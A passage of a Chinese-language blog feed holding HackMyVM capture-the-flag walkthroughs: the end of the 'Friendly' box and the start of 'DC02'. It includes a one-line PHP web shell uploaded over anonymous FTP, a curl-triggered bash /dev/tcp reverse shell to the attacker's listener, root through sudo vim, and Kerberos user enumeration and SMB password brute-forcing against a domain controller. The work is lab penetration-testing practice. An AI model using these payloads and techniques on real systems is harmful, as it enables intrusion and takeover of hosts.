Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">15.28</span> seconds</code></pre>
<p>开启了21 80两个端口</p>
<h1 id="ftp匿名登录"><a href="#ftp匿名登录" class="headerlink" title="ftp匿名登录"></a>ftp匿名登录</h1><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ftp 192.168.56.177</span>
Connected to <span class="token number">192.168</span>.56.177.
<span class="token number">220</span> ProFTPD Server <span class="token punctuation">(</span>friendly<span class="token punctuation">)</span> <span class="token punctuation">[</span>::ffff:192.168.56.177<span class="token punctuation">]</span>
Name <span class="token punctuation">(</span><span class="token number">192.168</span>.56.177:root<span class="token punctuation">)</span>: anonymous
<span class="token number">331</span> Anonymous login ok, send your complete email address as your password
Password: 
<span class="token number">230</span> Anonymous access granted, restrictions apply
Remote system <span class="token builtin class-name">type</span> is UNIX.
Using binary mode to transfer files.
ftp<span class="token operator">></span> <span class="token function">ls</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">62814</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening ASCII mode data connection <span class="token keyword">for</span> <span class="token function">file</span> list
-rw-r--r--   <span class="token number">1</span> root     root        <span class="token number">10725</span> Feb <span class="token number">23</span>  <span class="token number">2023</span> index.html
<span class="token number">226</span> Transfer complete
ftp<span class="token operator">></span> <span class="token function">ls</span> 
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">27311</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening ASCII mode data connection <span class="token keyword">for</span> <span class="token function">file</span> list
-rw-r--r--   <span class="token number">1</span> root     root        <span class="token number">10725</span> Feb <span class="token number">23</span>  <span class="token number">2023</span> index.html
<span class="token number">226</span> Transfer complete
ftp<span class="token operator">></span> get index.html
local: index.html remote: index.html
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">54379</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> index.html <span class="token punctuation">(</span><span class="token number">10725</span> bytes<span class="token punctuation">)</span>
<span class="token number">100</span>% <span class="token operator">|</span>********************************************************************************************************************************************************************************************<span class="token operator">|</span> <span class="token number">10725</span>      <span class="token number">116.22</span> MiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete
<span class="token number">10725</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">949.73</span> KiB/s<span class="token punctuation">)</span></code></pre>

<p>打开看了一下是个apache2默认界面，打开web发现正好对应这个界面，说明ftp就是html的目录，那么可以替换成一个反弹shell的php文件，我喜欢传个一句话木马</p>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># cat aa.php    </span>
<span class="token operator">&lt;</span>?<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>$_GET<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token variable">`</span></span><span class="token punctuation">;</span></code></pre>
<p>put到机器上</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ftp<span class="token operator">></span> put aa.php
local: aa.php remote: aa.php
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">2199</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> aa.php
<span class="token number">100</span>% <span class="token operator">|</span>**********************************************************************************************************************************************************************************************<span class="token operator">|</span>    <span class="token number">15</span>      <span class="token number">209.26</span> KiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete
<span class="token number">15</span> bytes sent <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">21.41</span> KiB/s<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.177/aa.php?1=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.104%2F4567%20%200%3E%261%27</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567                 </span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.177<span class="token punctuation">]</span> <span class="token number">54136</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">441</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
www-data@friendly:/var/www/html$ <span class="token function">id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code></pre>
<h1 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h1><pre class="language-bash" data-language="bash"><code class="language-bash">www-data@friendly:/home/RiJaba1$ <span class="token function">ls</span>
CTF  Private  YouTube  user.txt
www-data@friendly:/home/RiJaba1$ <span class="token function">cat</span> user.txt 
b8cff8c9008e1c98a1f2937b4475acd6
www-data@friendly:/home/RiJaba1$ </code></pre>
<p>在RiJaba目录下拿到user flag，但是还没有RiJaba权限<br>看一下sudo</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@friendly:/home/RiJaba1$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> www-data on friendly:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User www-data may run the following commands on friendly:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/vim</code></pre>
<p>阿这，直接vim提权，底端命令行输入!bash</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">~
~
~
~
~                              VIM - Vi IMproved
~
~                               version <span class="token number">8.2</span>.2434
~                           by Bram Moolenaar et al.
~                   Modified by team+vim@tracker.debian.org
~                 Vim is <span class="token function">open</span> <span class="token builtin class-name">source</span> and freely distributable
~
~                        Become a registered Vim user<span class="token operator">!</span>
~                <span class="token builtin class-name">type</span>  :help register<span class="token operator">&lt;</span>Enter<span class="token operator">></span>   <span class="token keyword">for</span> information
~
~                <span class="token builtin class-name">type</span>  :q<span class="token operator">&lt;</span>Enter<span class="token operator">></span>               to <span class="token builtin class-name">exit</span>
~                <span class="token builtin class-name">type</span>  :help<span class="token operator">&lt;</span>Enter<span class="token operator">></span>  or  <span class="token operator">&lt;</span>F<span class="token operator"><span class="token file-descriptor important">1</span>></span>  <span class="token keyword">for</span> on-line <span class="token builtin class-name">help</span>
~                <span class="token builtin class-name">type</span>  :help version<span class="token operator"><span class="token file-descriptor important">8</span>&lt;</span>Enter<span class="token operator">></span>   <span class="token keyword">for</span> version info
~
~
~
~
~
:<span class="token operator">!</span>bash                                              
root@friendly:/home/RiJaba1<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>拿到root权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@friendly:~<span class="token comment"># ls -al</span>
total <span class="token number">32</span>
drwx------  <span class="token number">3</span> root root <span class="token number">4096</span> May <span class="token number">27</span> 01:06 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root root <span class="token number">4096</span> Mar <span class="token number">11</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">9</span> Feb <span class="token number">23</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">571</span> Apr <span class="token number">10</span>  <span class="token number">2021</span> .bashrc
drwxr-xr-x  <span class="token number">3</span> root root <span class="token number">4096</span> Feb <span class="token number">21</span>  <span class="token number">2023</span> .local
-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">161</span> Jul  <span class="token number">9</span>  <span class="token number">2019</span> .profile
-rw-------  <span class="token number">1</span> root root  <span class="token number">839</span> May <span class="token number">27</span> 01:06 .viminfo
-r-xr-xr-x  <span class="token number">1</span> root root  <span class="token number">509</span> Mar <span class="token number">11</span>  <span class="token number">2023</span> interfaces.sh
-r--------  <span class="token number">1</span> root root   <span class="token number">24</span> Mar <span class="token number">11</span>  <span class="token number">2023</span> root.txt
root@friendly:~<span class="token comment"># cat ro*</span>
Not yet<span class="token operator">!</span> Find root.txt.</code></pre>
<p>看root.txt提示还没有完成，找到root.txt，直接find一手</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@friendly:~<span class="token comment"># find / -name root.txt 2>/dev/null</span>
/var/log/apache2/root.txt
/root/root.txt
root@friendly:~<span class="token comment"># cat /var/log/apache2/root.txt</span>
66b5c58f3e83aff307441714d3e28d2f</code></pre>
<p>果然是friendly的靶机，十分钟内拿下,饭还没吃完，晚上回来做2。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>vim提权</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-DC02</title>
    <url>/posts/9c57f07c/</url>
    <content><![CDATA[<p><strong>难度:Medium</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.126</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:77:db:85       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.126  08:00:27:be:ce:fb       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.946</span> seconds <span class="token punctuation">(</span><span class="token number">131.55</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap  <span class="token number">192.168</span>.56.126 <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T5</span> <span class="token parameter variable">-A</span>       
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-16 <span class="token number">11</span>:12 CST
Nmap scan report <span class="token keyword">for</span> christmas.hmv <span class="token punctuation">(</span><span class="token number">192.168</span>.56.126<span class="token punctuation">)</span>
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00025s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65517</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain        Simple DNS Plus
<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2024</span>-07-16 <span class="token number">18</span>:13:10Z<span class="token punctuation">)</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5?
<span class="token number">593</span>/tcp   <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">636</span>/tcp   <span class="token function">open</span>  tcpwrapped
<span class="token number">3268</span>/tcp  <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">3269</span>/tcp  <span class="token function">open</span>  tcpwrapped
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">9389</span>/tcp  <span class="token function">open</span>  mc-nmf        .NET Message Framing
<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49676</span>/tcp <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">49689</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49709</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:BE:CE:FB <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running <span class="token punctuation">(</span>JUST GUESSING<span class="token punctuation">)</span>: Microsoft Windows <span class="token number">2022</span><span class="token operator">|</span><span class="token number">11</span><span class="token operator">|</span><span class="token number">2016</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server <span class="token number">2022</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>, Microsoft Windows <span class="token number">11</span> 21H2 <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Microsoft Windows Server <span class="token number">2016</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>
No exact OS matches <span class="token keyword">for</span> <span class="token function">host</span> <span class="token punctuation">(</span>test conditions non-ideal<span class="token punctuation">)</span>.
Network Distance: <span class="token number">1</span> hop
Service Info: Host: DC01<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span>_clock-skew: 14h59m58s
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled and required
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2024</span>-07-16T18:14:02
<span class="token operator">|</span>_  start_date: N/A
<span class="token operator">|</span>_nbstat: NetBIOS name: DC01, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">></span>, NetBIOS MAC: 08:00:27:be:ce:fb <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.25</span> ms christmas.hmv <span class="token punctuation">(</span><span class="token number">192.168</span>.56.126<span class="token punctuation">)</span>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">152.39</span> seconds</code></pre>
<p>跟DC1开放端口情况一样，还是先进行常规的SMB服务探测</p>
<h2 id="SMB探测"><a href="#SMB探测" class="headerlink" title="SMB探测"></a>SMB探测</h2><pre class="language-bash" data-language="bash"><code class="language-bash"> smbmap <span class="token parameter variable">-H</span>  <span class="token number">192.168</span>.56.126 <span class="token parameter variable">-u</span> anonymous 

    ________  ___      ___  _______   ___      ___       __         _______
   /<span class="token string">"       )|"</span>  <span class="token punctuation">\</span>    /<span class="token string">"  ||   _  "</span><span class="token punctuation">\</span> <span class="token operator">|</span><span class="token string">"  \    /"</span>  <span class="token operator">|</span>     /<span class="token string">""</span><span class="token punctuation">\</span>       <span class="token operator">|</span>   __ <span class="token string">"\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /"</span> <span class="token punctuation">\</span>   <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">||</span><span class="token builtin class-name">:</span> <span class="token operator">|</span>_<span class="token punctuation">)</span>  <span class="token builtin class-name">:</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">|</span> /   /  <span class="token punctuation">\</span>   <span class="token punctuation">\</span>  /<span class="token operator">|</span>__/ <span class="token punctuation">\</span>
  <span class="token punctuation">(</span>_______/  <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>_______/ <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>___/    <span class="token punctuation">\</span>___<span class="token punctuation">)</span><span class="token punctuation">(</span>_______<span class="token punctuation">)</span>
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator <span class="token operator">|</span> Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Detected <span class="token number">1</span> hosts serving SMB
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Established <span class="token number">0</span> SMB session<span class="token punctuation">(</span>s<span class="token punctuation">)</span>  </code></pre>
<p>这次一点匿名共享目录都没有，不能lookupsid了，先找下域名吧</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> ldapsearch <span class="token parameter variable">-H</span> ldap://192.168.56.126 <span class="token parameter variable">-x</span> <span class="token parameter variable">-s</span> base <span class="token parameter variable">-b</span> <span class="token string">''</span> <span class="token string">"(objectClass=*)"</span> <span class="token string">"*"</span> + 

ldapServiceName: SOUPEDECODE.LOCAL:dc01<span class="token variable">$@</span>SOUPEDECODE.LOCAL
dnsHostName: DC01.SOUPEDECODE.LOCAL</code></pre>
<p>域名还是<code>SOUPEDECODE.LOCAL</code>，添加到hosts</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.56.126 dc01.soupedecode.local soupedecode.local</code></pre>
<p>然后利用Kerbrute枚举一下用户名</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> ./kerbrute_linux_amd64 userenum <span class="token parameter variable">--dc</span> <span class="token number">192.168</span>.56.126 <span class="token parameter variable">-d</span> soupedecode.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ <span class="token punctuation">\</span>/ ___/ __ <span class="token punctuation">\</span>/ ___/ / / / __/ _ <span class="token punctuation">\</span>
 / ,<span class="token operator">&lt;</span> /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___/_/  /_.___/_/   <span class="token punctuation">\</span>__,_/<span class="token punctuation">\</span>__/<span class="token punctuation">\</span>___/                                        

Version: v1.0.3 <span class="token punctuation">(</span>9dad6e1<span class="token punctuation">)</span> - 07/16/24 - Ronnie Flathers @ropnop

<span class="token number">2024</span>/07/16 <span class="token number">14</span>:25:29 <span class="token operator">></span>  Using KDC<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:
<span class="token number">2024</span>/07/16 <span class="token number">14</span>:25:29 <span class="token operator">></span>   <span class="token number">192.168</span>.56.126:88

<span class="token number">2024</span>/07/16 <span class="token number">14</span>:25:29 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       charlie@soupedecode.local
<span class="token number">2024</span>/07/16 <span class="token number">14</span>:25:29 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       Charlie@soupedecode.local
<span class="token number">2024</span>/07/16 <span class="token number">14</span>:25:29 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       administrator@soupedecode.local
<span class="token number">2024</span>/07/16 <span class="token number">14</span>:25:30 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       Administrator@soupedecode.local
<span class="token number">2024</span>/07/16 <span class="token number">14</span>:25:30 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       CHARLIE@soupedecode.local
<span class="token number">2024</span>/07/16 <span class="token number">14</span>:26:37 <span class="token operator">></span>  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> VALID USERNAME:       wreed11@soupedecode.local</code></pre>
<p>拿到一些用户名保存起来，然后跑一下密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - <span class="token number">192.168</span>.56.126:445 - Starting SMB login bruteforce
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - <span class="token number">192.168</span>.56.126:445 - Success: <span class="token string">'.\charlie:charlie'</span>
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - No active DB -- Credential data will not be saved<span class="token operator">!</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - <span class="token number">192.168</span>.56.126:445 - Success: <span class="token string">'.\Charlie:charlie'</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - <span class="token number">192.168</span>.56.126:445 - Failed: <span class="token string">'.\administrator:charlie'</span>,
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - <span class="token number">192.168</span>.56.126:445 - Failed: <span class="token string">'.\administrator:administrator'</span>,
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - <span class="token number">192.168</span>.56.126:445 - Failed: <span class="token string">'.\Administrator:charlie'</span>,
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - <span class="token number">192.168</span>.56.126:445 - Failed: <span class="token string">'.\Administrator:Administrator'</span>,
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - <span class="token number">192.168</span>.56.126:445 - Success: <span class="token string">'.\CHARLIE:charlie'</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - <span class="token number">192.168</span>.56.126:445 - Failed: <span class="token string">'.\wreed11:charlie'</span>,
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - <span class="token number">192.168</span>.56.126:445 - Failed: <span class="token string">'.\wreed11:wreed11'</span>,
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span>% complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - Bruteforce completed, <span class="token number">3</span> credentials were successful.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.126:445    - You can <span class="token function">open</span> an SMB session with these credentials and CreateSession <span class="token builtin class-name">set</span> to <span class="token boolean">true</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed</code></pre>
<p>拿到一组账号密码<code>charlie:charlie</code></p>
<h2 id="lookupsid"><a href="#lookupsid" class="headerlink" title="lookupsid"></a>lookupsid</h2><p>看一下目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbmap  <span class="token parameter variable">-H</span> <span class="token number">192.168</span>.56.126 <span class="token parameter variable">-u</span> charlie <span class="token parameter variable">-p</span> charlie

    ________  ___      ___  _______   ___      ___       __         _______
   /<span class="token string">"       )|"</span>  <span class="token punctuation">\</span>    /<span class="token string">"  ||   _  "</span><span class="token punctuation">\</span> <span class="token operator">|</span><span class="token string">"  \    /"</span>  <span class="token operator">|</span>     /<span class="token string">""</span><span class="token punctuation">\</span>       <span class="token operator">|</span>   __ <span class="token string">"\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /"</span> <span class="token punctuation">\</span>   <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">||</span><span class="token builtin class-name">:</span> <span class="token operator">|</span>_<span class="token punctuation">)</span>  <span class="token builtin class-name">:</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">|</span> /   /  <span class="token punctuation">\</span>   <span class="token punctuation">\</span>  /<span class="token operator">|</span>__/ <span class="token punctuation">\</span>
  <span class="token punctuation">(</span>_______/  <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>_______/ <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>___/    <span class="token punctuation">\</span>___<span class="token punctuation">)</span><span class="token punctuation">(</span>_______<span class="token punctuation">)</span>
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator <span class="token operator">|</span> Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Detected <span class="token number">1</span> hosts serving SMB
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Established <span class="token number">1</span> SMB session<span class="token punctuation">(</span>s<span class="token punctuation">)</span>                                
                                                                                                    
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: <span class="token number">192.168</span>.56.126:445      Name: christmas.hmv             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
